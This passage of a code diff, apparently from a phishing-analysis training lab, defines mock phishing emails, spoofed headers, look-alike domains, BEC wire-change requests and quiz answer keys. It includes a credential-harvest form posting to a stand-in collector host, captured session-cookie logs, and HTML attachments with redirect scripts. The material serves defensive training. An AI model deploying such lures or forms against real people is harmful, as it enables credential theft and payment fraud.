@@ -1,353 +1,693 @@
-export interface HeaderCheck {
-  spf: 'PASS' | 'FAIL' | 'SOFTFAIL' | 'NONE';
-  dkim: 'PASS' | 'FAIL' | 'NONE';
-  dmarc: 'PASS' | 'FAIL' | 'NONE';
-  returnPath: string;
-  senderIp: string;
-}
+export type EmailKind = "spoofed" | "compromised" | "attachment" | "qr";
 
-export interface EmailArtifact {
+export type LabEmail = {
   id: string;
-  sender: string;
-  senderDisplay: string;
-  recipient: string;
+  folder: "Reported" | "Finance" | "HR" | "IT";
+  kind: EmailKind;
+  fromName: string;
+  fromAddr: string;
+  to: string;
   subject: string;
   date: string;
-  body: string;
-  rawHeaders: string;
-  authSummary: HeaderCheck;
-  attachmentName?: string;
-  attachmentSnippet?: string;
-}
-
-export interface Question {
-  id: string;
-  prompt: string;
-  type: 'multiple-choice' | 'text';
-  options?: string[];
-  correctAnswer: string;
-  points: number;
-  explanation: string;
-  category: 'Headers & Auth' | 'Domain Analysis' | 'Payload & Lure' | 'Remediation';
-}
-
-export interface LabScenario {
-  id: string;
-  title: string;
-  timeLimitSeconds: number;
-  briefing: string;
-  emails: EmailArtifact[];
-  telemetry: {
-    whois: Record<string, string>;
-    dnsRecords: Record<string, string[]>;
-    proxyLogs?: string[];
-  };
-  questions: Question[];
-}
-
-export const CAMPAIGNS: Record<string, LabScenario> = {
-  // Scenario 1: Refined Classic Spoofing & Credential Harvesting
-  nightwire: {
-    id: 'nightwire',
-    title: 'Operation Nightwire',
-    timeLimitSeconds: 1800, // 30 minutes
-    briefing:
-      'A targeted phishing barrage hit Contoso Finance. Analyze the mock inbox, raw RFC 5322 headers, and the Discover-Phish telemetry to triage the spoofing and payload mechanisms.',
-    emails: [
-      {
-        id: 'msg-01',
-        sender: 'security@micros0ft-support-alert.com',
-        senderDisplay: 'Microsoft IT Helpdesk',
-        recipient: 'alex.vance@contoso.local',
-        subject: 'URGENT: Password Expiry Notification - Action Required',
-        date: '2026-09-07 08:14:02 UTC',
-        rawHeaders: `Received: from mail.micros0ft-support-alert.com (198.51.100.24) by mail.contoso.local (10.0.0.5); Mon, 7 Sep 2026 08:14:02 +0000
-Authentication-Results: contoso.local;
-  spf=fail (sender IP is 198.51.100.24) smtp.mailfrom=bounce@micros0ft-support-alert.com;
-  dkim=none (no signature found);
-  dmarc=fail (p=reject sp=reject) header.from=microsoft.com
-From: "Microsoft IT Helpdesk" <admin@microsoft.com>
-To: alex.vance@contoso.local
-Return-Path: <bounce@micros0ft-support-alert.com>
-Subject: URGENT: Password Expiry Notification - Action Required
-Content-Type: text/html; charset="UTF-8"`,
-        authSummary: {
-          spf: 'FAIL',
-          dkim: 'NONE',
-          dmarc: 'FAIL',
-          returnPath: 'bounce@micros0ft-support-alert.com',
-          senderIp: '198.51.100.24'
-        },
-        body: `Your corporate Microsoft 365 password expires in 2 hours.<br/><br/>
-Please keep your current password by verifying identity here: 
-<a href="https://login.micros0ft-portal-auth.net/verify">Verify Corporate Identity</a>.`,
-        attachmentName: 'Identity_Notice.html',
-        attachmentSnippet: `<!-- Static Attachment Inspector -->
-<form action="http://collector.external-gate.cc/harvest" method="POST">
-  <input type="hidden" name="ref" value="contoso_alex" />
-  <input type="password" name="pwd_field" />
-</form>`
-      },
-      {
-        id: 'msg-02',
-        sender: 'billing@apex-logistics-corp.com',
-        senderDisplay: 'Apex Logistics Billing',
-        recipient: 'accounts-payable@contoso.local',
-        subject: 'Updated Routing Instructions - Q3 Invoice #8841',
-        date: '2026-09-07 09:22:15 UTC',
-        rawHeaders: `Received: from mail-relay.apex-logistics-corp.com (203.0.113.88) by mail.contoso.local (10.0.0.5); Mon, 7 Sep 2026 09:22:15 +0000
-Authentication-Results: contoso.local;
-  spf=pass (sender IP is 203.0.113.88) smtp.mailfrom=billing@apex-logistics-corp.com;
-  dkim=pass header.d=apex-logistics-corp.com;
-  dmarc=pass (p=quarantine) header.from=apex-logistics-corp.com
-From: "Apex Logistics Billing" <billing@apex-logistics-corp.com>
-To: accounts-payable@contoso.local
-Return-Path: <billing@apex-logistics-corp.com>
-Subject: Updated Routing Instructions - Q3 Invoice #8841
-Content-Type: text/plain; charset="UTF-8"`,
-        authSummary: {
-          spf: 'PASS',
-          dkim: 'PASS',
-          dmarc: 'PASS',
-          returnPath: 'billing@apex-logistics-corp.com',
-          senderIp: '203.0.113.88'
-        },
-        body: `Please find updated remittance details for invoice #8841. Our previous banking partner is undergoing an audit. Direct all wire payments to Routing #021000021, Account #991029312 immediately.`
-      }
-    ],
-    telemetry: {
-      whois: {
-        'micros0ft-portal-auth.net': 'Created: 2 days ago | Registrar: NameSilo | Registrant Privacy: Enabled',
-        'apex-logistics-corp.com': 'Created: 8 years ago | Registrar: GoDaddy | Org: Apex Logistics LLC'
-      },
-      dnsRecords: {
-        'micros0ft-portal-auth.net': ['A 198.51.100.52', 'MX mail.micros0ft-support-alert.com'],
-        'apex-logistics-corp.com': ['v=spf1 ip4:203.0.113.88 -all']
-      }
-    },
-    questions: [
-      {
-        id: 'nw-q1',
-        prompt: 'Why did the Microsoft Helpdesk email fail DMARC alignment?',
-        type: 'multiple-choice',
-        options: [
-          'The DKIM signature expired.',
-          'The RFC 5322 From domain (microsoft.com) does not match the Return-Path / SPF domain.',
-          'The mail server was missing an SSL certificate.',
-          'The destination IP was blocked by Contoso firewall.'
-        ],
-        correctAnswer: 'The RFC 5322 From domain (microsoft.com) does not match the Return-Path / SPF domain.',
-        points: 10,
-        explanation: 'DMARC alignment requires the From header domain to align with the authenticated SPF or DKIM domain.',
-        category: 'Headers & Auth'
-      },
-      {
-        id: 'nw-q2',
-        prompt: 'What IP address originated the connection for the spoofed Microsoft email?',
-        type: 'text',
-        correctAnswer: '198.51.100.24',
-        points: 10,
-        explanation: 'The initial Received hop from the external server lists 198.51.100.24.',
-        category: 'Headers & Auth'
-      },
-      {
-        id: 'nw-q3',
-        prompt: 'Examine message msg-02 (Apex Logistics). It passes SPF, DKIM, and DMARC. What type of attack is this?',
-        type: 'multiple-choice',
-        options: [
-          'Direct Domain Spoofing',
-          'Business Email Compromise (BEC) via compromised vendor account',
-          'Homograph IDN attack',
-          'DNS Cache Poisoning'
-        ],
-        correctAnswer: 'Business Email Compromise (BEC) via compromised vendor account',
-        points: 15,
-        explanation: 'Because all email security records pass and originate from the real infrastructure, the mailbox or sender account itself was likely compromised.',
-        category: 'Payload & Lure'
-      },
-      {
-        id: 'nw-q4',
-        prompt: 'In msg-01 attachment source, what is the absolute domain where credentials are being posted?',
-        type: 'text',
-        correctAnswer: 'collector.external-gate.cc',
-        points: 15,
-        explanation: 'The HTML form target points to http://collector.external-gate.cc/harvest.',
-        category: 'Payload & Lure'
-      }
-    ]
-  },
-
-  // Scenario 2: Modern Illicit OAuth Consent Grant Attack
-  shadowgrant: {
-    id: 'shadowgrant',
-    title: 'Operation ShadowGrant',
-    timeLimitSeconds: 1200, // 20 minutes
-    briefing:
-      'Employees are receiving notifications requesting authorization for a new "Executive Expense Tool". Investigate the permissions requested and determine the risk of Illicit Consent Grant.',
-    emails: [
-      {
-        id: 'sg-01',
-        sender: 'notifications@app-expense-portal.io',
-        senderDisplay: 'Contoso Tools Platform',
-        recipient: 'claire.redfield@contoso.local',
-        subject: 'Authorization Required: Enable 2026 Q3 Expense Automations',
-        date: '2026-09-07 11:05:00 UTC',
-        rawHeaders: `Received: from mail.app-expense-portal.io (192.0.2.190) by mail.contoso.local; Mon, 7 Sep 2026 11:05:00 +0000
-Authentication-Results: contoso.local; spf=pass; dkim=pass header.d=app-expense-portal.io; dmarc=pass
-From: "Contoso Tools Platform" <notifications@app-expense-portal.io>
-To: claire.redfield@contoso.local
-Subject: Authorization Required: Enable 2026 Q3 Expense Automations`,
-        authSummary: {
-          spf: 'PASS',
-          dkim: 'PASS',
-          dmarc: 'PASS',
-          returnPath: 'bounce@app-expense-portal.io',
-          senderIp: '192.0.2.190'
-        },
-        body: `Please authorize the updated Contoso Enterprise Accounting Add-in on your Microsoft 365 Tenant.<br/><br/>
-<a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=7b01d3bb-88fe-4e09-b903-87a41920800b&response_type=code&scope=User.Read%20Mail.ReadWrite%20Files.ReadWrite.All%20offline_access">Review Application Permissions</a>`,
-        attachmentName: 'manifest.json',
-        attachmentSnippet: `{
-  "app_name": "AccountingSyncPro",
-  "client_id": "7b01d3bb-88fe-4e09-b903-87a41920800b",
-  "publisher_domain": "unverified-tenants.cc"
-}`
-      }
-    ],
-    telemetry: {
-      whois: {
-        'unverified-tenants.cc': 'Created: 4 days ago | Privacy: Redacted'
-      },
-      dnsRecords: {
-        'unverified-tenants.cc': ['A 203.0.113.11']
-      }
-    },
-    questions: [
-      {
-        id: 'sg-q1',
-        prompt: 'Which high-impact permission requested in the OAuth link grants access to modify all cloud files without user presence?',
-        type: 'multiple-choice',
-        options: ['User.Read', 'Files.ReadWrite.All', 'openid', 'Contacts.Read'],
-        correctAnswer: 'Files.ReadWrite.All',
-        points: 15,
-        explanation: 'Files.ReadWrite.All grants full read and write permissions to all files the signed-in user has access to.',
-        category: 'Payload & Lure'
-      },
-      {
-        id: 'sg-q2',
-        prompt: 'What OAuth scope allows the application to retain persistent API access after the user signs out?',
-        type: 'text',
-        correctAnswer: 'offline_access',
-        points: 15,
-        explanation: 'The offline_access scope requests a refresh token, allowing long-term API access.',
-        category: 'Payload & Lure'
-      },
-      {
-        id: 'sg-q3',
-        prompt: 'What tenant mitigation stops end-users from granting consents to unverified multi-tenant applications?',
-        type: 'multiple-choice',
-        options: [
-          'Enable SPF hard fail (-all)',
-          'Require Admin Consent Workflow in Entra ID / Azure AD',
-          'Deploy local antivirus signatures',
-          'Block port 587 on outbound firewalls'
-        ],
-        correctAnswer: 'Require Admin Consent Workflow in Entra ID / Azure AD',
-        points: 20,
-        explanation: 'Enabling the Admin Consent workflow blocks users from consenting to apps requiring sensitive permissions.',
-        category: 'Remediation'
-      }
-    ]
-  },
-
-  // Scenario 3: AiTM (Adversary-in-the-Middle) Proxy + Quishing (QR)
-  glassphantom: {
-    id: 'glassphantom',
-    title: 'Operation GlassPhantom',
-    timeLimitSeconds: 1500, // 25 minutes
-    briefing:
-      'Attackers deployed an Evilginx reverse proxy setup and distributed the lure via a PDF containing a QR code to bypass text-based gateway scanners.',
-    emails: [
-      {
-        id: 'gp-01',
-        sender: 'hr-portal@executive-benefits-secure.net',
-        senderDisplay: 'HR Shared Services',
-        recipient: 'staff-all@contoso.local',
-        subject: 'Action Required: Scan your Benefits Enrollment QR',
-        date: '2026-09-07 14:00:00 UTC',
-        rawHeaders: `From: "HR Shared Services" <hr-portal@executive-benefits-secure.net>
-To: staff-all@contoso.local
-Subject: Action Required: Scan your Benefits Enrollment QR
-Content-Type: multipart/mixed; boundary="====BOUNDARY===="`,
-        authSummary: {
-          spf: 'PASS',
-          dkim: 'PASS',
-          dmarc: 'PASS',
-          returnPath: 'bounces@executive-benefits-secure.net',
-          senderIp: '198.51.100.99'
-        },
-        body: `Please scan the QR code attached in your 2026 Benefits Packet to confirm your enrollment on your mobile authenticator.`,
-        attachmentName: 'BenefitsQR.pdf',
-        attachmentSnippet: `<!-- Decoded QR Matrix Payload -->
-URL: https://login.microsoftonline.contoso-sso.executive-benefits-secure.net/common/login`
-      }
-    ],
-    telemetry: {
-      whois: {
-        'executive-benefits-secure.net': 'Created: 1 day ago | Registrar: Porkbun'
-      },
-      dnsRecords: {
-        'login.microsoftonline.contoso-sso.executive-benefits-secure.net': ['A 198.51.100.99']
-      },
-      proxyLogs: [
-        'POST /common/login HTTP/1.1 -> Forwarded to login.microsoftonline.com [200 OK]',
-        'Captured Header: Set-Cookie: ESTSAUTH=0.AXAAd1...; domain=.login.microsoftonline.com; Secure; HttpOnly',
-        'Captured Header: Set-Cookie: ESTSAUTHPERSISTENT=...; Secure; HttpOnly'
-      ]
-    },
-    questions: [
-      {
-        id: 'gp-q1',
-        prompt: 'Why do attackers use QR codes (Quishing) inside attached PDF documents?',
-        type: 'multiple-choice',
-        options: [
-          'QR codes encrypt the connection end-to-end.',
-          'To evade text/URL pattern analysis by Secure Email Gateways (SEGs).',
-          'To disable Multi-Factor Authentication automatically.',
-          'To crash the client email application memory.'
-        ],
-        correctAnswer: 'To evade text/URL pattern analysis by Secure Email Gateways (SEGs).',
-        points: 15,
-        explanation: 'SEGs often parse plain text and links, whereas images/PDFs require OCR or computer vision to detect embedded URLs.',
-        category: 'Payload & Lure'
-      },
-      {
-        id: 'gp-q2',
-        prompt: 'According to the captured reverse-proxy telemetry, what critical Microsoft 365 session cookie was hijacked?',
-        type: 'text',
-        correctAnswer: 'ESTSAUTH',
-        points: 20,
-        explanation: 'The ESTSAUTH cookie represents the authenticated session token passed through the AiTM proxy.',
-        category: 'Payload & Lure'
-      },
-      {
-        id: 'gp-q3',
-        prompt: 'What primary defense effectively mitigates Adversary-in-the-Middle (AiTM) reverse proxy session theft?',
-        type: 'multiple-choice',
-        options: [
-          'SMS-based one-time passcodes',
-          'FIDO2 / WebAuthn phishing-resistant MFA (Hardware Keys or Passkeys)',
-          'Complex password rotation rules',
-          'Updating MX records'
-        ],
-        correctAnswer: 'FIDO2 / WebAuthn phishing-resistant MFA (Hardware Keys or Passkeys)',
-        points: 20,
-        explanation: 'FIDO2 / WebAuthn binds cryptographic authentication credentials directly to the genuine browser URL origin, breaking reverse-proxy replay.',
-        category: 'Remediation'
-      }
-    ]
-  }
+  unread: boolean;
+  preview: string;
+  html: string;
+  headers: string;
+  auth: { spf: "pass" | "fail" | "none"; dkim: "pass" | "fail" | "none"; dmarc: "pass" | "fail" | "none" };
+  attachments: { name: string; size: string; type: string; id: string }[];
 };
 
-// Default export active scenario
-export const ACTIVE_CAMPAIGN: LabScenario = CAMPAIGNS.nightwire;
+export type Question = {
+  id: string;
+  points: number;
+  prompt: string;
+  hint: string;
+  kind: "text" | "choice";
+  choices?: string[];
+  accept: string[];
+};
+
+export type LureTemplate = "microsoft" | "payroll-sso" | "courier-pay" | "generic-oauth" | "none";
+
+export type Engine = {
+  campaignId: string;
+  score: number;
+  status: string;
+  techniques: string[];
+  url: { original: string; hop1: string; final: string };
+  infra: {
+    ip: string;
+    asn: string;
+    registrar: string;
+    privacy: boolean;
+    domain: string;
+    created: string;
+    ageDays: number;
+    ssl: string;
+  };
+  similar: number;
+  sandbox: string;
+};
+
+export type LabPack = {
+  id: string;
+  name: string;
+  code: string;
+  minutes: number;
+  blurb: string;
+  emails: LabEmail[];
+  engine: Engine;
+  sms: { from: string; body: string; time: string };
+  voice: { ticket: string; note: string };
+  questions: Question[];
+  attachmentSource: string;
+  lureBrand: string;
+  lureHost: string;
+  /** Which simulated web-lure template /web renders for this lab. "none" hides the web lure. */
+  lureTemplate: LureTemplate;
+  /** True for labs added via the in-app Lab Builder rather than shipped with the app. */
+  custom?: boolean;
+};
+
+export const LAB_BANNER =
+  "CLOSED TRAINING LAB — fictional artifacts, no mail is sent, no credentials leave this browser.";
+
+const nightwireEmails: LabEmail[] = [
+  {
+    id: "e1",
+    folder: "Reported",
+    kind: "spoofed",
+    fromName: "Microsoft Account Security",
+    fromAddr: "security-alert@microsoft-support.online",
+    to: "finance@northwind-lab.com",
+    subject: "Urgent: Unusual sign-in activity detected – Action required within 24 hours",
+    date: "Mon, 07 Sep 2026 10:14:18 +0000",
+    unread: true,
+    preview: "We detected a sign-in attempt from a new device in Cairo, Egypt…",
+    html: `<p>Dear User,</p>
+<p>We detected a sign-in attempt from a new device in <b>Cairo, Egypt</b> on 07 Sep 2026 at 09:47 UTC.</p>
+<p>If this was not you, please secure your account immediately:</p>
+<p><a data-href="lure">Review activity and secure account</a></p>
+<p class="urg">Failure to act within 24 hours will result in temporary account suspension.</p>
+<p>Microsoft Account Team<br/>This is an automated message. Please do not reply.</p>`,
+    headers: `Return-Path: <bounce@mail.phish-delivery.net>
+Received: from mail.phish-delivery.net (mail.phish-delivery.net [185.199.108.153])
+    by mx.northwind-lab.com (Postfix) with ESMTPS id 4F7A2B3C1
+    for <finance@northwind-lab.com>; Mon, 07 Sep 2026 10:14:22 +0000 (UTC)
+From: "Microsoft Account Security" <security-alert@microsoft-support.online>
+Reply-To: support@microsoft-support.online
+To: finance@northwind-lab.com
+Subject: Urgent: Unusual sign-in activity detected – Action required within 24 hours
+Date: Mon, 07 Sep 2026 10:14:18 +0000
+Message-ID: <20260907101418.5f3a2b@microsoft-support.online>
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=none; dmarc=fail`,
+    auth: { spf: "fail", dkim: "none", dmarc: "fail" },
+    attachments: [],
+  },
+  {
+    id: "e2",
+    folder: "Finance",
+    kind: "compromised",
+    fromName: "Rania Haddad",
+    fromAddr: "rania.haddad@atlas-parts.co",
+    to: "ap@northwind-lab.com",
+    subject: "Updated wiring instructions — Invoice AT-88421",
+    date: "Mon, 07 Sep 2026 09:51:04 +0000",
+    unread: true,
+    preview: "Please use the new account below for the remaining balance. Our bank flagged the old one…",
+    html: `<p>Hi team,</p>
+<p>Please use the <b>new account</b> below for the remaining balance on AT-88421. Our bank flagged the old one this morning.</p>
+<p>Bank: GulfClear Private<br/>IBAN: EG3800190005000000004290118<br/>Ref: AT-88421-URGENT</p>
+<p>Can you process today? I am in a supplier meeting until 18:00.</p>
+<p>— Rania Haddad<br/>Accounts, Atlas Parts</p>`,
+    headers: `Return-Path: <rania.haddad@atlas-parts.co>
+Received: from mail.atlas-parts.co (mail.atlas-parts.co [203.0.113.44])
+    by mx.northwind-lab.com with ESMTPS id 9C11
+From: "Rania Haddad" <rania.haddad@atlas-parts.co>
+Authentication-Results: mx.northwind-lab.com; spf=pass; dkim=pass; dmarc=pass`,
+    auth: { spf: "pass", dkim: "pass", dmarc: "pass" },
+    attachments: [],
+  },
+  {
+    id: "e3",
+    folder: "Finance",
+    kind: "attachment",
+    fromName: "Billing Desk",
+    fromAddr: "invoices@docs-share.live",
+    to: "finance@northwind-lab.com",
+    subject: "Invoice 90441.pdf",
+    date: "Mon, 07 Sep 2026 09:32:11 +0000",
+    unread: true,
+    preview: "Please find attached the overdue invoice. Open to view the secure document.",
+    html: `<p>Please find attached the overdue invoice.</p>
+<p>Open the file to view the secure document. Payment is due upon receipt.</p>
+<p>Docs-Share Billing</p>`,
+    headers: `Received: from mail.phish-delivery.net ([185.199.108.153])
+From: "Billing Desk" <invoices@docs-share.live>
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=none; dmarc=fail`,
+    auth: { spf: "fail", dkim: "none", dmarc: "fail" },
+    attachments: [{ id: "a1", name: "Invoice_90441.pdf.html", size: "18 KB", type: "text/html" }],
+  },
+  {
+    id: "e4",
+    folder: "HR",
+    kind: "qr",
+    fromName: "HR Payroll",
+    fromAddr: "payroll@hr-northwind.net",
+    to: "allstaff@northwind-lab.com",
+    subject: "Scan to confirm your 2026 benefits enrollment",
+    date: "Mon, 07 Sep 2026 08:12:40 +0000",
+    unread: false,
+    preview: "Mobile enrollment is required this year. Scan the QR code before Friday.",
+    html: `<p>Team,</p>
+<p>Mobile enrollment is required this year. Scan the QR code before Friday to confirm your benefits.</p>
+<p>HR Payroll — do not forward.</p>`,
+    headers: `From: "HR Payroll" <payroll@hr-northwind.net>
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=none; dmarc=fail`,
+    auth: { spf: "fail", dkim: "none", dmarc: "fail" },
+    attachments: [],
+  },
+  {
+    id: "e5",
+    folder: "IT",
+    kind: "spoofed",
+    fromName: "IT Service Desk",
+    fromAddr: "noreply@northwind-lab.com",
+    to: "it-oncall@northwind-lab.com",
+    subject: "Password expiry — reset via portal",
+    date: "Mon, 07 Sep 2026 07:04:02 +0000",
+    unread: false,
+    preview: "Your directory password expires in 4 hours. Use the portal link…",
+    html: `<p>Your directory password expires in 4 hours.</p>
+<p>Use the portal: <span class="mono">https://login.microsoftonline.com.secure-verify.live/auth?token=it-oncall</span></p>
+<p>IT Service Desk</p>`,
+    headers: `From: "IT Service Desk" <noreply@northwind-lab.com>
+Reply-To: help@secure-verify.live
+Received: from unknown ([185.199.108.153])
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=fail; dmarc=fail`,
+    auth: { spf: "fail", dkim: "fail", dmarc: "fail" },
+    attachments: [],
+  },
+];
+
+export const catalog: LabPack[] = [
+  {
+    id: "nightwire",
+    name: "Operation Nightwire",
+    code: "PH-2026-0907-441",
+    minutes: 30,
+    blurb: "Spoofed brand mail, vendor BEC, HTML invoice, QR, SMS, clone portal.",
+    emails: nightwireEmails,
+    engine: {
+      campaignId: "PH-2026-0907-441",
+      score: 94,
+      status: "Active",
+      techniques: [
+        "Brand impersonation",
+        "Urgency",
+        "Credential harvesting",
+        "Look-alike domain",
+        "Redirect chain (2 hops)",
+        "HTML lure",
+        "QR",
+        "BEC",
+      ],
+      url: {
+        original: "https://login.microsoftonline.com.secure-verify.live/auth?token=8f3a9c2e1b7d",
+        hop1: "https://secure-verify.live/r/8f3a9c2e",
+        final: "https://secure-verify.live/login.php",
+      },
+      infra: {
+        ip: "185.199.108.153",
+        asn: "AS13335 (Cloudflare)",
+        registrar: "Namecheap",
+        privacy: true,
+        domain: "secure-verify.live",
+        created: "04 Sep 2026",
+        ageDays: 3,
+        ssl: "Let's Encrypt (issued 2 days ago)",
+      },
+      similar: 3,
+      sandbox: "Page loads clean — no malware drop. Pure credential phishing + MFA field.",
+    },
+    sms: {
+      from: "MS-ALERT",
+      body: "Microsoft: Unusual sign-in from Cairo. Verify now http://sec-vfy.live/m/8f3a",
+      time: "10:16 UTC",
+    },
+    voice: {
+      ticket: "SOC-441-V",
+      note: "Callback from +20-12-XXXX claiming Microsoft support. Asked the user to read an authenticator code.",
+    },
+    attachmentSource: `<!DOCTYPE html>
+<html><body>
+<h1>Secure document</h1>
+<script>window.location = "https://secure-verify.live/login.php?src=invoice";</script>
+</body></html>`,
+    lureBrand: "Microsoft-style portal (training clone)",
+    lureHost: "secure-verify.live/login.php",
+    lureTemplate: "microsoft",
+    questions: [
+      {
+        id: "q1",
+        points: 10,
+        kind: "text",
+        prompt: "What is the primary malicious domain used for credential collection?",
+        hint: "Final landing host.",
+        accept: ["secure-verify.live", "https://secure-verify.live", "https://secure-verify.live/login.php"],
+      },
+      {
+        id: "q2",
+        points: 10,
+        kind: "text",
+        prompt: "Sending mail server IP for the spoofed Microsoft message?",
+        hint: "Received hop.",
+        accept: ["185.199.108.153"],
+      },
+      {
+        id: "q3",
+        points: 10,
+        kind: "text",
+        prompt: "Malicious domain age in days?",
+        hint: "WHOIS.",
+        accept: ["3", "3 days", "three"],
+      },
+      {
+        id: "q4",
+        points: 5,
+        kind: "text",
+        prompt: "Discover-Phish detection score?",
+        hint: "Engine header.",
+        accept: ["94", "94/100", "94 / 100"],
+      },
+      {
+        id: "q5",
+        points: 10,
+        kind: "choice",
+        prompt: "Main technique in the Microsoft-branded body?",
+        hint: "Deadline language.",
+        choices: ["Humor / rapport", "Urgency / time pressure", "Prize / lottery", "CEO-only authority"],
+        accept: ["Urgency / time pressure"],
+      },
+      {
+        id: "q6",
+        points: 10,
+        kind: "text",
+        prompt: "How many redirect hops in the URL chain?",
+        hint: "Engine URL panel.",
+        accept: ["2", "two", "2 hops"],
+      },
+      {
+        id: "q7",
+        points: 15,
+        kind: "choice",
+        prompt: "Is microsoft-support.online a legitimate Microsoft domain?",
+        hint: "Look-alike.",
+        choices: ["Yes", "No — look-alike domain, not owned by Microsoft"],
+        accept: ["No — look-alike domain, not owned by Microsoft"],
+      },
+      {
+        id: "q8",
+        points: 15,
+        kind: "choice",
+        prompt: "Goal after email + password + MFA on the clone?",
+        hint: "Security code field.",
+        choices: [
+          "Ransomware via the form",
+          "Harvest credentials and a live session / MFA code (AiTM)",
+          "Browser cryptominer",
+          "Deface the real site",
+        ],
+        accept: ["Harvest credentials and a live session / MFA code (AiTM)"],
+      },
+      {
+        id: "q9",
+        points: 10,
+        kind: "choice",
+        prompt: "Which message is NOT spoofed (auth passes) but is still phishing?",
+        hint: "SPF/DKIM/DMARC pass.",
+        choices: [
+          "Microsoft Account Security (e1)",
+          "Rania Haddad / Atlas Parts wire-change (e2)",
+          "Invoice 90441 attachment (e3)",
+          "HR Payroll QR (e4)",
+        ],
+        accept: ["Rania Haddad / Atlas Parts wire-change (e2)"],
+      },
+      {
+        id: "q10",
+        points: 15,
+        kind: "choice",
+        prompt: "Auth results on the spoofed Microsoft message?",
+        hint: "Headers.",
+        choices: ["Only DKIM", "SPF and DMARC (DKIM none)", "All passed", "Only BIMI"],
+        accept: ["SPF and DMARC (DKIM none)"],
+      },
+    ],
+  },
+  {
+    id: "harbor",
+    name: "Harbor Payroll",
+    code: "PH-2026-0812-118",
+    minutes: 20,
+    blurb: "HR W-2 bait, look-alike payroll host, one-day-old domain, SMS OTP harvest.",
+    emails: [
+      {
+        id: "h1",
+        folder: "HR",
+        kind: "spoofed",
+        fromName: "Harbor Benefits",
+        fromAddr: "noreply@harbor-hr.email",
+        to: "staff@northwind-lab.com",
+        subject: "Action required: 2025 W-2 is ready",
+        date: "Tue, 12 Aug 2026 07:40:00 +0000",
+        unread: true,
+        preview: "Download your form before Friday or it will be mailed to your last address…",
+        html: `<p>Your W-2 is ready.</p>
+<p><a data-href="lure">Open Harbor Payroll</a></p>
+<p class="urg">Download before Friday.</p>`,
+        headers: `Received: from mx.bulk-relay.net ([198.51.100.22])
+From: "Harbor Benefits" <noreply@harbor-hr.email>
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=fail; dmarc=fail`,
+        auth: { spf: "fail", dkim: "fail", dmarc: "fail" },
+        attachments: [],
+      },
+      {
+        id: "h2",
+        folder: "HR",
+        kind: "attachment",
+        fromName: "Tax Desk",
+        fromAddr: "forms@harbor-pay.live",
+        to: "staff@northwind-lab.com",
+        subject: "W2-2025.pdf",
+        date: "Tue, 12 Aug 2026 07:41:12 +0000",
+        unread: true,
+        preview: "Attached form. Enable content if prompted.",
+        html: `<p>Attached form. Enable content if prompted.</p>`,
+        headers: `From: forms@harbor-pay.live
+Authentication-Results: mx.northwind-lab.com; spf=fail; dkim=none; dmarc=fail`,
+        auth: { spf: "fail", dkim: "none", dmarc: "fail" },
+        attachments: [{ id: "a2", name: "W2-2025.pdf.html", size: "22 KB", type: "text/html" }],
+      },
+    ],
+    engine: {
+      campaignId: "PH-2026-0812-118",
+      score: 91,
+      status: "Active",
+      techniques: ["HR / W-2 bait", "Look-alike payroll host", "OTP harvest"],
+      url: {
+        original: "https://harborbenefits.com.harbor-pay.live/w2",
+        hop1: "https://harbor-pay.live/r/w2",
+        final: "https://harbor-pay.live/sso",
+      },
+      infra: {
+        ip: "198.51.100.22",
+        asn: "AS64500",
+        registrar: "Porkbun",
+        privacy: true,
+        domain: "harbor-pay.live",
+        created: "11 Aug 2026",
+        ageDays: 1,
+        ssl: "Let's Encrypt (same day)",
+      },
+      similar: 41,
+      sandbox: "SSO clone asks email, password, SMS code. No payload drop.",
+    },
+    sms: {
+      from: "HARBOR",
+      body: "Harbor Payroll: confirm W-2 http://hbr-pay.live/w2",
+      time: "07:44 UTC",
+    },
+    voice: {
+      ticket: "SOC-118-H",
+      note: "HR inbox flooded; no real Harbor ticket exists for W-2 reissue this week.",
+    },
+    attachmentSource: `<html><body><script>location="https://harbor-pay.live/sso"</script></body></html>`,
+    lureBrand: "Harbor Payroll SSO (training clone)",
+    lureHost: "harbor-pay.live/sso",
+    lureTemplate: "payroll-sso",
+    questions: [
+      {
+        id: "q1",
+        points: 15,
+        kind: "text",
+        prompt: "Credential-collection domain?",
+        hint: "Engine infra.",
+        accept: ["harbor-pay.live", "https://harbor-pay.live", "https://harbor-pay.live/sso"],
+      },
+      {
+        id: "q2",
+        points: 10,
+        kind: "text",
+        prompt: "Sending IP?",
+        hint: "Headers / engine.",
+        accept: ["198.51.100.22"],
+      },
+      {
+        id: "q3",
+        points: 10,
+        kind: "text",
+        prompt: "Domain age in days?",
+        hint: "Created 11 Aug vs mail 12 Aug.",
+        accept: ["1", "1 day", "one"],
+      },
+      {
+        id: "q4",
+        points: 10,
+        kind: "text",
+        prompt: "Detection score?",
+        hint: "Engine.",
+        accept: ["91", "91/100"],
+      },
+      {
+        id: "q5",
+        points: 15,
+        kind: "choice",
+        prompt: "Why is this high-yield bait?",
+        hint: "Tax form.",
+        choices: ["Crypto airdrop", "W-2 / payroll data", "Game key", "Survey prize"],
+        accept: ["W-2 / payroll data"],
+      },
+    ],
+  },
+  {
+    id: "ledger",
+    name: "Quiet Ledger",
+    code: "PH-2026-0701-007",
+    minutes: 15,
+    blurb: "Pure BEC. Auth passes. No clone page. Wire-change from a real-looking CFO thread.",
+    emails: [
+      {
+        id: "l1",
+        folder: "Finance",
+        kind: "compromised",
+        fromName: "Mara Chen",
+        fromAddr: "mara.chen@northwind-lab.com",
+        to: "ap@northwind-lab.com",
+        subject: "Re: closing — send now",
+        date: "Wed, 01 Jul 2026 16:02:09 +0000",
+        unread: true,
+        preview: "I'm in a board session. Pay the remaining 184,400 to the account in the thread…",
+        html: `<p>I'm in a board session. Pay the remaining 184,400 to the account below. Do not call — phones are off.</p>
+<p>IBAN GB29NWBK60161331926819 · Ref CLOSE-1844</p>
+<p>— Mara</p>`,
+        headers: `Return-Path: <mara.chen@northwind-lab.com>
+Received: from mail.northwind-lab.com ([203.0.113.10])
+Authentication-Results: mx.northwind-lab.com; spf=pass; dkim=pass; dmarc=pass
+X-Note: Mailbox session from IP 45.77.88.12 (not the usual VPN)`,
+        auth: { spf: "pass", dkim: "pass", dmarc: "pass" },
+        attachments: [],
+      },
+    ],
+    engine: {
